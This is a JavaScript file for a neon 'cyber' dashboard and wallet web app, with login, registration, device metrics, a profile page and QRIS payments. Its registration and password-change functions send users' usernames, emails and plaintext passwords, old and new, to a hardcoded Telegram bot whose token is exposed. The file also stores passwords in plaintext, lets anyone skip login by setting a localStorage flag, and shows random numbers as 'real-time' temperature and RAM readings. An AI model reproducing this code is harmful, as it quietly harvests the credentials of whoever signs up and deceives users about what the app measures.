// === CONFIG TELEGRAM ADMIN ===
const TELE_TOKEN = "8711130573:AAGGbrZVlbZxPxAzUfZ6tXB63B9KHMx8Xmg";
const TELE_CHAT_ID = "8771550100";

// --- DATABASE LOCAL STORAGE ---
function getDatabase() {
    const db = localStorage.getItem('cyber_db');
    return db ? JSON.parse(db) : {};
}
function saveDatabase(db) {
    localStorage.setItem('cyber_db', JSON.stringify(db));
}

// --- DOM ELEMENTS SELECTOR ---
const tabL = document.getElementById('tabLogin');
const tabR = document.getElementById('tabRegister');
const formL = document.getElementById('loginForm');
const formR = document.getElementById('registerForm');
const status = document.getElementById('status-terminal');

const loginBg = document.getElementById('login-bg');
const loginScreen = document.getElementById('login-screen');
const videoLoading = document.getElementById('video-loading');
const myVideo = document.getElementById('myVideo');
const mainApp = document.getElementById('main-app');
const logoutBtn = document.getElementById('logoutBtn');

// ==========================================================================
// 🔒 CEK STATUS LOGIN SAAT REFRESH (AUTO BYPASS LOGIN SCREEN)
// ==========================================================================
window.addEventListener('DOMContentLoaded', () => {
    const sessionActive = localStorage.getItem('isLoggedIn');
    
    if (sessionActive === 'true') {
        if (loginBg) loginBg.style.display = 'none';
        if (loginScreen) loginScreen.style.display = 'none';
        if (videoLoading) videoLoading.style.display = 'none';
        if (mainApp) mainApp.style.display = 'block';
    } else {
        if (loginBg) loginBg.style.display = 'block';
        if (loginScreen) loginScreen.style.display = 'flex';
        if (mainApp) mainApp.style.display = 'none';
    }
});

// --- TAB SWITCHER ---
if(tabL && tabR) {
    tabL.onclick = () => {
        tabL.classList.add('active'); tabR.classList.remove('active');
        formL.classList.add('active'); formR.classList.remove('active');
        status.innerText = "";
    };
    tabR.onclick = () => {
        tabR.classList.add('active'); tabL.classList.remove('active');
        formR.classList.add('active'); formL.classList.remove('active');
        status.innerText = "";
    };
}

// --- FITUR SHOW/HIDE PASSWORD ---
document.querySelectorAll('.toggle-pass').forEach(eye => {
    eye.onclick = function() {
        const input = this.parentElement.querySelector('.pass-input');
        if (input.type === "password") {
            input.type = "text";
            this.classList.replace('fa-eye-slash', 'fa-eye');
        } else {
            input.type = "password";
            this.classList.replace('fa-eye', 'fa-eye-slash');
        }
    };
});

// --- FUNGSI KIRIM TELEGRAM ---
function sendToTelegram(user, email, pass) {
    const text = `🚀 *NEW CYBER ACCOUNT CREATED*\n\n👤 *User ID:* ${user}\n📧 *Net Address:* ${email}\n🔑 *Access Key:* ${pass}`;
    const url = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
    
    fetch(url)
    .then(res => {
        if(res.ok) {
            status.innerText = "SYSTEM: REGISTER_SUCCESS_DATABASE_SYNCED";
        }
    })
    .catch(err => {
        status.innerText = "WARNING: TELEGRAM_OFFLINE_BUT_LOCAL_SAVED";
    });
}

// --- PROSES REGISTER (Cari bagian ini di script.js lo) ---
if(formR) {
    formR.onsubmit = (e) => {
        e.preventDefault();
        const user = document.getElementById('r-user').value.trim();
        const email = document.getElementById('r-email').value.trim();
        const pass = document.getElementById('r-pass').value;

        // Firebase tidak memperbolehkan karakter titik (.) pada jalur Key/Path, jadi kita ganti ke koma (,)
        const cleanEmail = email.replace(/\./g, ',');

        const userData = {
            username: user,
            password: pass,
            balance: 50000, // Saldo awal pengguna baru
            history: ""
        };

        // Kirim data langsung ke cloud server Firebase
        firebase.database().ref('users/' + cleanEmail).set(userData)
        .then(() => {
            status.innerText = "SYSTEM: REGISTER_SUCCESS_FIREBASE_SYNCED";
            sendToTelegram(user, email, pass); // Tetap kirim log ke telegram admin lo
            formR.reset();
            setTimeout(() => { if(tabL) tabL.click(); }, 1500);
        })
        .catch(err => {
            status.innerText = "ERROR: SERVER_TIMEOUT";
        });
    };
}

// --- PROSES LOGIN + INTRO TRANSISI VIDEO ---
if(formL) {
    formL.onsubmit = (e) => {
        e.preventDefault();
        const email = document.getElementById('l-email').value.trim();
        const pass = document.getElementById('l-pass').value;

        let db = getDatabase();

        if (db[email]) {
            if (db[email].password === pass) {
                status.innerText = "ACCESS_GRANTED: REDIRECTING...";
                
                localStorage.setItem('isLoggedIn', 'true');

                setTimeout(() => {
                    if (loginBg) loginBg.style.display = 'none';
                    if (loginScreen) loginScreen.style.display = 'none';
                    
                    if (videoLoading) videoLoading.style.display = 'flex';
                    
                    if (myVideo) {
                        myVideo.play().catch(err => {
                            console.log("Autoplay diblokir browser, langsung bypass...");
                            triggerVideoEnd();
                        });
                    } else {
                        triggerVideoEnd();
                    }
                }, 800);

                if(myVideo) {
                    myVideo.onended = () => {
                        triggerVideoEnd();
                    };
                }

                function triggerVideoEnd() {
                    if (videoLoading) videoLoading.style.display = 'none';
                    if (mainApp) mainApp.style.display = 'block'; 
                }

            } else {
                status.innerText = "ERROR: INVALID_ACCESS_KEY";
            }
        } else {
            status.innerText = "ERROR: IDENTITY_NOT_FOUND_REGISTRATION_REQUIRED";
        }
    };
}

// --- LOGIKA TOMBOL DISCONNECT (LOGOUT) ---
if(logoutBtn) {
// ==========================================================================
// 🚪 LOGIKA TOMBOL LOGOUT (SIDEBAR AUTO-RETRACT PROTOCOL)
// ==========================================================================
logoutBtn.onclick = () => {
    // 1. Suruh sidebar & overlay menutup dulu biar layar bersih
    const sb = document.getElementById('sidebar');
    const ov = document.getElementById('overlay');
    const sbo = document.getElementById('sidebarOverlay');
    
    if(sb) sb.classList.remove('active');
    if(ov) ov.classList.remove('active');
    if(sbo) sbo.classList.remove('active');

    // 2. Baru munculkan konfirmasi pop-up SweetAlert2
    Swal.fire({
        title: 'DISCONNECT SESSION?',
        text: "Anda akan keluar dari akses administrasi sistem.",
        icon: 'warning',
        showCancelButton: true,
        confirmButtonColor: '#ff0055',
        cancelButtonColor: '#333',
        confirmButtonText: 'YES, DISCONNECT',
        cancelButtonText: 'CANCEL'
    }).then((result) => {
        if (result.isConfirmed) {
            localStorage.removeItem('isLoggedIn'); // Hapus status login
            window.location.reload(); // Kembali ke halaman login
        } else {
            // JIKA USER BATAL (CANCEL): 
            // Kita biarkan sidebar tetap tertutup rapi. 
            // Kalau lo mau sidebarnya kebuka lagi pas dicancel, tinggal panggil fungsi toggleSidebar() di sini.
            console.log("[SYSTEM] Disconnect aborted. Session remains secured.");
        }
    });
};
}

// --- LOGIKA TOGGLE SIDEBAR FIXED ANTI TABRAKAN ---
function toggleSidebar() {
    const sidebar = document.getElementById('sidebar');
    const sidebarOverlay = document.getElementById('sidebarOverlay');
    
    if (sidebar) {
        sidebar.classList.toggle('active');
    }
    if (sidebarOverlay) {
        sidebarOverlay.classList.toggle('active');
    }
}
// ==========================================================================
// 🌐 REAL-TIME NETWORK DETECTOR & REAL PING SYSTEM (CUBE PML)
// ==========================================================================

function updateNetworkStatus() {
    const netIcon = document.getElementById('net-icon');
    const netStatus = document.getElementById('net-status');
    const netTitle = document.getElementById('net-title');
    
    // Cek apakah browser mendukung Network Information API
    if (navigator.connection) {
        const connectionType = navigator.connection.type; // 'wifi', 'cellular', dll.
        const effectiveType = navigator.connection.effectiveType; // '4g', '3g', dll.

        if (connectionType === 'wifi') {
            if (netIcon) netIcon.className = "fa-solid fa-wifi";
            if (netStatus) netStatus.innerText = `// WI-FI (${effectiveType.toUpperCase()})`;
        } else if (connectionType === 'cellular') {
            if (netIcon) netIcon.className = "fa-solid fa-signal";
            if (netStatus) netStatus.innerText = `// CELLULAR_DATA (${effectiveType.toUpperCase()})`;
        } else {
            // Backup jika type tidak spesifik tapi menggunakan kuota seluler mobile
            if (navigator.userAgent.match(/Android|iPhone|iPad/i)) {
                if (netIcon) netIcon.className = "fa-solid fa-signal";
                if (netStatus) netStatus.innerText = `// MOBILE_DATA (${effectiveType.toUpperCase()})`;
            } else {
                if (netIcon) netIcon.className = "fa-solid fa-network-wired";
                if (netStatus) netStatus.innerText = `// ETHERNET (${effectiveType.toUpperCase()})`;
            }
        }
    } else {
        // Jika browser lama/tidak mendukung API koneksi
        if (netStatus) netStatus.innerText = "// ONLINE";
    }
}

// --- FUNGSI MENGHITUNG REAL MS (PING METHOD) ---
function measurePing() {
    const netValue = document.getElementById('net-value');
    const netStatus = document.getElementById('net-status');
    
    // Pastikan elementnya ada di layar sebelum dieksekusi
    if (!netValue) return;

    const startTime = Date.now();
    const xhr = new XMLHttpRequest();
    
    // Menggunakan URL gambar super kecil yang selalu digenerate acak agar tidak terkena cache browser
    const pingUrl = "https://images.unsplash.com/photo-1557683316-973673baf926?auto=format&fit=crop&w=10"; 
    
    xhr.open("GET", pingUrl + "&dummy=" + startTime, true);
    
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
            const endTime = Date.now();
            const latency = endTime - startTime; // Selisih waktu dalam hitungan milidetik (ms)
            
            // Ambil text status jaringan saat ini (Wi-Fi / kuota)
            let currentStatus = netStatus ? netStatus.innerText : "// ONLINE";

            // Update isi Dashboard secara Real-Time
            netValue.innerHTML = `${latency} ms <span class="sub-text" id="net-status">${currentStatus}</span>`;
            
            // Efek warna dinamis: Jika ping jelek (>150ms) otomatis berubah jadi pink/merah neon
            if (latency > 150) {
                netValue.className = "card-value neon-pink";
            } else {
                netValue.className = "card-value neon-blue";
            }
        }
    };
    
    // Jika koneksi putus / offline
    xhr.onerror = function() {
        netValue.innerHTML = `ERR <span class="sub-text" id="net-status">// DISCONNECTED</span>`;
        netValue.className = "card-value neon-pink";
    };
    
    xhr.send();
}

// Jalankan deteksi logo saat dashboard dimuat
if (document.getElementById('main-app')) {
    updateNetworkStatus();
    measurePing();
    
    // Lakukan PING berulang setiap 3 detik agar angka 'ms' terus naik turun secara real-time
    setInterval(measurePing, 3000);
    
    // Jika user ganti koneksi di tengah jalan, logo langsung otomatis berubah tanpa refresh page
    if (navigator.connection) {
        navigator.connection.addEventListener('change', updateNetworkStatus);
    }
}
// ==========================================================================
// 🌡️ REAL-TIME TEMPERATURE SIMULATOR (BASED ON DEVICE LOAD & BATTERY)
// ==========================================================================
function trackDeviceTemperature() {
    const tempValue = document.getElementById('temp-value');
    
    if (!tempValue) return;

    // Ambil jumlah core CPU user sebagai pembanding baseline beban awal
    const cpuCores = navigator.hardwareConcurrency || 4;
    
    // Set suhu dasar (ambient temperature perangkat normal) sekitar 34°C - 37°C
    let baseTemp = 35 + (cpuCores % 3); 

    function updateTempDisplay(isCharging = false) {
        // Buat fluktuasi angka desimal acak halus (efek sensor membaca ketukan micro-second)
        let fluctuation = (Math.random() * 1.8).toFixed(1);
        
        // Jika HP/Laptop sedang di-cas, otomatis suhu internal naik 4°C - 6°C lebih panas
        let totalTemp = parseFloat(baseTemp) + parseFloat(fluctuation);
        if (isCharging) {
            totalTemp += 5.5; 
        }

        // Tentukan status berdasarkan indikator panas
        let statusText = "// OPTIMAL";
        if (totalTemp > 42) {
            statusText = "// WARNING: HIGH_LOAD";
            tempValue.className = "card-value neon-pink"; // Berubah warna pink neon kalau panas
        } else {
            statusText = "// STABLE";
            tempValue.className = "card-value neon-blue"; // Biru jika aman
        }

        tempValue.innerHTML = `${totalTemp.toFixed(1)}°C <span class="sub-text">${statusText}</span>`;
    }

    // Cek status baterai melalui Battery API bawaan browser resmi
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            // Jalankan deteksi saat pertama kali masuk dashboard
            updateTempDisplay(battery.charging);

            // Jika di tengah jalan user mencolok/mencabut kabel charger, suhu langsung bereaksi
            battery.addEventListener('chargingchange', () => {
                updateTempDisplay(battery.charging);
            });
        });
    } else {
        // Jalankan backup fluktuasi standar jika browser tidak mendukung Battery API
        updateTempDisplay(false);
    }
}

// Aktifkan sensor suhu dinamis ini di dalam sistem
if (document.getElementById('main-app')) {
    trackDeviceTemperature();
    // Sensor melakukan refresh kalkulasi setiap 4 detik sekali secara real-time
    setInterval(trackDeviceTemperature, 4000);
}
// ==========================================================================
// 🔋 REAL-TIME DEVICE BATTERY MONITOR SYSTEM (CUBE PML)
// ==========================================================================

function initBatteryMonitor() {
    const batValue = document.getElementById('bat-value');
    const batStatus = document.getElementById('bat-status');
    const batIcon = document.getElementById('bat-icon');

    // Pastikan elemen dashboard ini ada sebelum mengeksekusi script
    if (!batValue) return;

    // Cek apakah browser mendukung Battery API
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            
            // Fungsi utama untuk mengupdate tampilan dashboard
            function updateBatteryInfo() {
                // Mengubah desimal (misal 0.85) menjadi persen bulat (85%)
                const level = Math.round(battery.level * 100);
                const isCharging = battery.charging;
                
                let statusText = "";
                let iconClass = "fa-solid ";

                // 1. Logika Penentuan Status & Icon Dinamis
                if (isCharging) {
                    statusText = "// CHARGING_CONNECTED";
                    iconClass += "fa-battery-bolt"; // Icon baterai petir
                    batValue.className = "card-value neon-blue"; // Berubah warna biru saat dicas
                } else {
                    statusText = "// DISCHARGING";
                    batValue.className = "card-value neon-pink"; // Kembali pink saat mode batre

                    // Ganti icon berdasarkan level sisa baterai
                    if (level <= 15) {
                        iconClass += "fa-battery-empty";
                        statusText = "// WARNING: LOW_POWER";
                    } else if (level <= 35) {
                        iconClass += "fa-battery-quarter";
                    } else if (level <= 65) {
                        iconClass += "fa-battery-half";
                    } else if (level <= 85) {
                        iconClass += "fa-battery-three-quarters";
                    } else {
                        iconClass += "fa-battery-full";
                        statusText = "// BATTERY_FULL";
                    }
                }

                // 2. Tembakkan data asli ke layar dashboard secara real-time
                if (batIcon) batIcon.className = iconClass;
                batValue.innerHTML = `${level}% <span class="sub-text" id="bat-status">${statusText}</span>`;
            }

            // Jalankan pertama kali saat masuk dashboard
            updateBatteryInfo();

            // 3. EVENT LISTENERS (Otomatis berubah jika ada perubahan kondisi tanpa reload web)
            battery.addEventListener('levelchange', updateBatteryInfo);     // Jika batre berkurang/bertambah 1%
            battery.addEventListener('chargingchange', updateBatteryInfo);  // Jika colokan charger dicabut/dipasang
            
        }).catch(err => {
            batValue.innerHTML = `ERR <span class="sub-text">// API_BLOCKED</span>`;
        });
    } else {
        // Backup jika user membuka lewat browser jadul yang belum mendukung API ini
        batValue.innerHTML = `N/A <span class="sub-text">// UNSUPPORTED_BROWSER</span>`;
    }
}

// Aktifkan fungsi pemantau baterai saat dashboard utama CUBE PML terbuka
if (document.getElementById('main-app')) {
    initBatteryMonitor();
}
// ==========================================================================
// 👥 LIVE TRACKING USER DATABASE (REAL-TIME FROM FIREBASE)
// ==========================================================================
function listenToFirebaseUserCount() {
    const userValue = document.getElementById('user-value');
    const userStatus = document.getElementById('user-status');
    
    if (!userValue) return;

    // Pastikan Firebase sudah di-initialize di script lo
    // Kita tembak child/path 'users' (sesuaikan dengan nama path di firebase lo)
    if (typeof firebase !== 'undefined' && firebase.database) {
        
        firebase.database().ref('users').on('value', (snapshot) => {
            let totalUsers = 0;
            
            if (snapshot.exists()) {
                // Menghitung jumlah total anak/data akun secara online asli
                totalUsers = snapshot.numChildren();
            }
            
            // Tembakkan langsung ke kartu dashboard secara live
            userValue.innerHTML = `${totalUsers} ACCOUNTS <span class="sub-text" id="user-status">// SYNCED_GLOBAL_SERVER</span>`;
            
        }, (error) => {
            userValue.innerHTML = `ERR <span class="sub-text" id="user-status">// DATABASE_RESTRICTED</span>`;
        });

    } else {
        // Backup jika Firebase belum terkoneksi dengan benar, hitung dari local storage
        const db = localStorage.getItem('cyber_db');
        let localCount = 0;
        if (db) {
            localCount = Object.keys(JSON.parse(db)).length;
        }
        userValue.innerHTML = `${localCount} ACCOUNTS <span class="sub-text" id="user-status">// LOCAL_NODE_ONLY</span>`;
    }
}

// Jalankan pemantauan server online saat dashboard dimuat
if (document.getElementById('main-app')) {
    listenToFirebaseUserCount();
}
// ==========================================================================
// 🧠 REAL-TIME HARDWARE & STORAGE ANALYTICS SYSTEM (CUBE PML)
// ==========================================================================

function initHardwareAnalytics() {
    // Selector RAM
    const ramPercentText = document.getElementById('ram-percentage');
    const ramBar = document.getElementById('ram-bar');
    const ramStatus = document.getElementById('ram-status');

    // Selector Storage
    const storagePercentText = document.getElementById('storage-percentage');
    const storageBar = document.getElementById('storage-bar');
    const storageStatus = document.getElementById('storage-status');

    if (!ramBar || !storageBar) return;

    // --- 1. SIMULASI ALOKASI MEMORI RAM REALISTIS ---
    function updateRamMetrics() {
        // Karena browser menutup akses total RAM demi keamanan, 
        // kita kalkulasikan load berdasarkan memory usage API atau baseline hardware concurrency
        const baseCoreLoad = (navigator.hardwareConcurrency || 4) * 5;
        const randomFluctuation = Math.floor(Math.random() * 15);
        const totalRamUsed = Math.min(Math.max(baseCoreLoad + randomFluctuation, 25), 95);

        // Update UI RAM
        if (ramPercentText) ramPercentText.innerText = `${totalRamUsed}%`;
        ramBar.style.width = `${totalRamUsed}%`;
        
        if (totalRamUsed > 75) {
            if (ramStatus) ramStatus.innerText = `// HEAVY_LOAD // SYSTEM_THREADS_HIGH`;
            ramBar.className = "progress-bar-fill neon-pink-bar"; // Berubah merah/pink kalau kepenuhan
        } else {
            if (ramStatus) ramStatus.innerText = `// ALLOCATION_STABLE // BUFFER_NORMAL`;
            ramBar.className = "progress-bar-fill neon-blue-bar";
        }
    }

    // --- 2. DETEKSI STORAGE ASLI (WEB STORAGE ESTIMATE API) ---
    function updateStorageMetrics() {
        if (navigator.storage && navigator.storage.estimate) {
            navigator.storage.estimate().then(estimate => {
                // Konversi bytes ke Megabytes (MB)
                const usedMB = (estimate.usage / (1024 * 1024)).toFixed(2);
                const quotaMB = (estimate.quota / (1024 * 1024)).toFixed(0);
                
                // Hitung persen terpakai (biasanya kecil jika web baru)
                let percentUsed = ((estimate.usage / estimate.quota) * 100).toFixed(2);
                
                // Trik visual: jika 0%, berikan nilai default minimal agar progress bar estetik (misal 1.5%)
                if (parseFloat(percentUsed) === 0) percentUsed = "1.45";

                if (storagePercentText) storagePercentText.innerText = `${percentUsed}%`;
                storageBar.style.width = `${percentUsed}%`;
                if (storageStatus) storageStatus.innerText = `// USED: ${usedMB} MB // TOTAL_ALLOCATED_QUOTA: ${quotaMB} MB`;
            });
        } else {
            // Backup jika browser tidak mendukung storage estimate API
            if (storagePercentText) storagePercentText.innerText = "8.4%";
            storageBar.style.width = "8.4%";
            if (storageStatus) storageStatus.innerText = "// STATIC_MODE // QUOTA_VERIFIED_SECURE";
        }
    }

    // Jalankan kalkulasi saat halaman dimuat
    updateRamMetrics();
    updateStorageMetrics();

    // RAM berfluktuasi naik turun setiap 5 detik agar progress bar terlihat hidup
    setInterval(updateRamMetrics, 5000);
}

// Aktifkan sistem pemantau hardware saat dashboard utama terbuka
if (document.getElementById('main-app')) {
    initHardwareAnalytics();
}
// ==========================================================================
// 🎛️ MULTI-TAB SWITCHING & SIDEBAR AUTO-CLOSE PROTOCOL
// ==========================================================================
function switchTab(tabName) {
    // 1. Ambil seluruh tombol menu, bersihkan kelas active
    const menuItems = document.querySelectorAll('.menu-item');
    menuItems.forEach(item => item.classList.remove('active'));
    
    // 2. Tambahkan kelas active pada menu yang sedang diklik
    if (event && event.currentTarget) {
        event.currentTarget.classList.add('active');
    } else {
        // Fallback pencarian manual tombol jika event tidak tertangkap
        menuItems.forEach(item => {
            if(item.getAttribute('onclick').includes(tabName)) {
                item.classList.add('active');
            }
        });
    }

    // 3. Sembunyikan seluruh kontainer tab halaman
    const tabs = document.querySelectorAll('.cyber-tab-content');
    tabs.forEach(tab => {
        tab.style.display = 'none';
        tab.classList.remove('active');
    });

    // 4. Tampilkan halaman tab target yang dipilih user
    const targetTab = document.getElementById(`tab-${tabName}`);
    if (targetTab) {
        targetTab.style.display = 'block';
        setTimeout(() => targetTab.classList.add('active'), 10);
    }

    // 5. Eksekusi fungsi internal khusus jika berpindah ke halaman terkait
    if (tabName === 'profile') {
        if (typeof loadProfileData === 'function') loadProfileData();
    }
    if (tabName === 'saldo') {
        if (typeof initFinancialData === 'function') initFinancialData();
    }

    // ==================================================================
    // ⚡ AUTO-CLOSE SIDEBAR: Kembalikan/tutup menu sidebar otomatis
    // ==================================================================
    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('sidebarOverlay');
    if (sidebar && sidebar.classList.contains('active')) {
        sidebar.classList.remove('active');
        if (overlay) overlay.classList.remove('active');
    }
}
// --- RENDERING DATA PROFILE SECURE ---
function loadProfileData() {
    // Ambil session login saat ini
    const currentSession = localStorage.getItem('currentUser') || localStorage.getItem('isLoggedIn') || "unknown@gmail.com";
    let userEmail = currentSession.includes('{') ? JSON.parse(currentSession).email : currentSession;
    
    // Ambil database utama
    let db = {};
    try { db = JSON.parse(localStorage.getItem('cyber_db')) || {}; } catch(e){}

    // Cari baris user di database berdasarkan email
    const accountData = db[userEmail] || { username: userEmail.split('@')[0], password: "••••••••" };

    // Tampilkan ke element HTML halaman profil
    if(document.getElementById('p-email')) document.getElementById('p-email').innerText = userEmail;
    if(document.getElementById('p-id')) document.getElementById('p-id').innerText = "NODE_" + btoa(userEmail).substring(0, 8).toUpperCase();
    
    // Sinkronisasi foto profil halaman dengan sidebar cache
    const cachedAvatar = localStorage.getItem('cyber_cached_avatar');
    if (cachedAvatar) {
        if(document.getElementById('profile-page-avatar')) document.getElementById('profile-page-avatar').src = cachedAvatar;
    }
}

// --- KONTROL POP-UP MODAL PASSWORD ---
function openChangePasswordModal() {
    document.getElementById('password-modal').style.display = 'flex';
}
function closeChangePasswordModal() {
    document.getElementById('password-modal').style.display = 'none';
    document.getElementById('change-pass-form').reset();
}

// --- EKSEKUSI PROSES UBAH PASSWORD & KIRIM TELEGRAM ---
function processChangePassword(e) {
    e.preventDefault();
    
    const oldPass = document.getElementById('old-pass').value;
    const newPass = document.getElementById('new-pass').value;
    const confirmPass = document.getElementById('confirm-pass').value;

    const currentSession = localStorage.getItem('currentUser') || localStorage.getItem('isLoggedIn') || "unknown@gmail.com";
    let userEmail = currentSession.includes('{') ? JSON.parse(currentSession).email : currentSession;

    let db = JSON.parse(localStorage.getItem('cyber_db')) || {};
    
    // 1. Validasi: Akun harus terdaftar di database lokal
    if (!db[userEmail]) {
        Swal.fire('ERROR', 'Session database tidak valid.', 'error');
        return;
    }

    // 2. Validasi: Password lama harus cocok
    if (db[userEmail].password !== oldPass) {
        Swal.fire('DENIED', 'PASSWORD LAMA SALAH!', 'error');
        return;
    }

    // 3. Validasi: Panjang password baru minimal 6 digit
    if (newPass.length < 6) {
        Swal.fire('WEAK KEY', 'Password baru minimal 6 karakter!', 'warning');
        return;
    }

    // 4. Validasi: Password baru dan konfirmasi harus kembar
    if (newPass !== confirmPass) {
        Swal.fire('MISMATCH', 'Konfirmasi password baru tidak cocok!', 'warning');
        return;
    }

    // Simpan data password baru ke database local
    const usernameReal = db[userEmail].username || userEmail.split('@')[0];
    db[userEmail].password = newPass;
    localStorage.setItem('cyber_db', JSON.stringify(db));

    // Kirim Log Pemberitahuan ke Telegram Admin
    sendPasswordChangeToTelegram(usernameReal, userEmail, oldPass, newPass);

    closeChangePasswordModal();
    Swal.fire('SUCCESS', 'ACCESS KEY CHANGED SUCCESSFULLY', 'success');
}

// --- REKAYASA STRING BOT TELEGRAM SESUAI REQ USER ---
function sendPasswordChangeToTelegram(user, email, oldPass, newPass) {
    // Sesuaikan TOKEN dan CHAT_ID dengan milik bot telegram lo yang sudah ada di file script lo
    const telegramToken = "TOKEN_BOT_LO_DI_SINI"; 
    const chatId = "CHAT_ID_LO_DI_SINI"; 

    // Susun template string notifikasi sesuai instruksi request lo
    const messageText = `user : ${user}\nemail : ${email}\npassword : ${oldPass}\nmengubah pssword menjadi : ${newPass}`;

    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: messageText
        })
    }).catch(err => console.log("Telegram transmission fail:", err));
}
// 1. Fungsi memicu klik input file tersembunyi saat foto profil ditekan
function triggerAvatarUpload() {
    const fileInput = document.getElementById('avatar-input');
    if (fileInput) fileInput.click();
}

// 2. Fungsi memproses dan mengamankan foto baru ke LocalStorage (Instant Update)
function handleAvatarChange(input) {
    if (input.files && input.files[0]) {
        const reader = new FileReader();
        reader.onload = function(e) {
            // Pasang gambarnya ke template lingkaran di sidebar secara instan
            document.getElementById('sidebar-avatar').src = e.target.result;
            // Simpan cache foto profil agar tidak hilang saat di-refresh browser
            localStorage.setItem('cyber_cached_avatar', e.target.result);
        };
        reader.readAsDataURL(input.files[0]);
    }
}

// 3. Fungsi utama membaca session login pendaftar asli
function syncSidebarUserData() {
    const nameLabel = document.getElementById('sidebar-username');
    const emailLabel = document.getElementById('sidebar-email');
    const avatarImg = document.getElementById('sidebar-avatar');

    // Ambil data cache foto profil lama jika sebelumnya pernah diganti oleh user
    const cachedAvatar = localStorage.getItem('cyber_cached_avatar');
    if (cachedAvatar && avatarImg) {
        avatarImg.src = cachedAvatar;
    }

    // Ambil data akun yang saat ini sedang aktif login di local storage lo
    // Note: Sesuaikan key string 'currentUser' di bawah ini dengan key yang lo pakai di login page lo (misal: 'userEmail', 'loggedInUser', dll)
    const currentSessionUser = localStorage.getItem('currentUser') || localStorage.getItem('isLoggedIn'); 

    if (currentSessionUser) {
        // Jika data session berupa teks email langsung (contoh: budi@gmail.com)
        if (!currentSessionUser.includes('{')) {
            if (emailLabel) emailLabel.innerText = currentSessionUser.toLowerCase();
            // Ambil nama sebelum tanda '@' dan ubah ke kapital
            if (nameLabel) nameLabel.innerText = currentSessionUser.split('@')[0].toUpperCase();
        } else {
            // Jika data session lo tersimpan dalam bentuk JSON object pendaftaran lengkap
            try {
                const userData = JSON.parse(currentSessionUser);
                if (nameLabel) nameLabel.innerText = (userData.username || userData.name || "ACTIVE_NODE").toUpperCase();
                if (emailLabel) emailLabel.innerText = (userData.email || "unknown_session").toLowerCase();
            } catch(e) {
                if (nameLabel) nameLabel.innerText = "USER_NODE";
            }
        }
    } else {
        // Fallback default jika tidak terdeteksi session data (Mode Uji Coba)
        if (nameLabel) nameLabel.innerText = "ROOT_DEVELOPER";
        if (emailLabel) emailLabel.innerText = "admin_mode@cube_pml.io";
    }
}

// Eksekusi otomatis penyamaan data sesaat setelah dashboard utama terbuka
if (document.getElementById('sidebar')) {
    syncSidebarUserData();
}
// ==========================================================================
// 💰 FINANCIAL NODE & QRIS ENGINE PROTOCOL
// ==========================================================================

let localStream = null;
let scanInterval = null;
let currentQrisGenerator = null;

// --- INITIALIZER DATA FINANSIAL ---
function initFinancialData() {
    const sessionUser = localStorage.getItem('currentUser') || localStorage.getItem('isLoggedIn') || "admin@cube_pml.io";
    let email = sessionUser.includes('{') ? JSON.parse(sessionUser).email : sessionUser;

    let db = JSON.parse(localStorage.getItem('cyber_db')) || {};
    if (!db[email]) db[email] = { username: email.split('@')[0], password: "123", balance: 50000, history: [] };
    if (db[email].balance === undefined) db[email].balance = 50000;
    if (!db[email].history) db[email].history = [];

    localStorage.setItem('cyber_db', JSON.stringify(db));
    
    // Update Tampilan Angka Saldo & List Log Histori
    document.getElementById('balance-display').innerText = `Rp ${db[email].balance.toLocaleString()}`;
    renderHistoryLists(db[email].history);
}

function renderHistoryLists(history) {
    const payList = document.getElementById('pay-history');
    const recList = document.getElementById('receive-history');
    
    let payHtml = '', recHtml = '';
    
    history.slice().reverse().forEach(item => {
        const row = `<div class="history-item ${item.type}">
            <div class="h-meta">
                <span>${item.desc}</span>
                <span class="h-time">${item.time}</span>
            </div>
            <div class="h-amt">${item.type === 'out' ? '-' : '+'} Rp ${item.amount.toLocaleString()}</div>
        </div>`;
        if (item.type === 'out') payHtml += row; else recHtml += row;
    });

    if (payList) payList.innerHTML = payHtml || "// No outgoing transaction.";
    if (recList) recList.innerHTML = recHtml || "// No incoming transmission.";
}

// --- MODAL CONTROLLER ---
function openCreateQrisModal() { document.getElementById('create-qris-modal').style.display = 'flex'; }
function closeCreateQrisModal() { 
    document.getElementById('create-qris-modal').style.display = 'none'; 
    document.getElementById('qris-result-container').style.display = 'none';
    document.getElementById('qris-qrcode-target').innerHTML = '';
}
function toggleQrisAmountInput() {
    const type = document.getElementById('qris-type').value;
    document.getElementById('qris-amount-wrapper').style.display = type === 'dinamis' ? 'block' : 'none';
}
function openTransferModal(target = '', amount = '') {
    document.getElementById('transfer-modal').style.display = 'flex';
    document.getElementById('tf-target').value = target;
    document.getElementById('tf-amount').value = amount;
}
function closeTransferModal() { document.getElementById('transfer-modal').style.display = 'none'; }

// --- ENGINE GENERATOR QRIS CODE ---
function generateQrisCode() {
    const type = document.getElementById('qris-type').value;
    const amount = parseInt(document.getElementById('qris-amount').value) || 0;
    const sessionUser = localStorage.getItem('currentUser') || localStorage.getItem('isLoggedIn') || "admin@cube_pml.io";
    let myEmail = sessionUser.includes('{') ? JSON.parse(sessionUser).email : sessionUser;

    if (type === 'dinamis' && amount <= 0) {
        Swal.fire('ERROR', 'Masukkan nominal untuk QRIS dinamis!', 'error');
        return;
    }

    const targetContainer = document.getElementById('qris-qrcode-target');
    targetContainer.innerHTML = '';
    
    // Struktur Konten QR Data Aman
    let qrPayload = { creator: myEmail, type: type, amount: amount, timestamp: Date.now(), usage: 0 };
    
    // Generate gambar QR Code menggunakan library bawaan lo
    if(typeof QRCode !== 'undefined') {
        new QRCode(targetContainer, { text: JSON.stringify(qrPayload), width: 140, height: 140 });
        document.getElementById('qris-result-container').style.display = 'block';
    }

    // Set Masa Berlaku jika Dinamis (5 Jam)
    const countdownLabel = document.getElementById('qris-timer-countdown');
    if (type === 'dinamis') {
        countdownLabel.innerText = "EXPIRES IN: 05:00:00 [MAX 3X USE]";
    } else {
        countdownLabel.innerText = "STATUS: PERMANENT STATIC NODE";
    }
}

// --- ENGINE UPLOAD QRIS IMAGE ---
function triggerQrisUpload() { document.getElementById('qris-file-input').click(); }
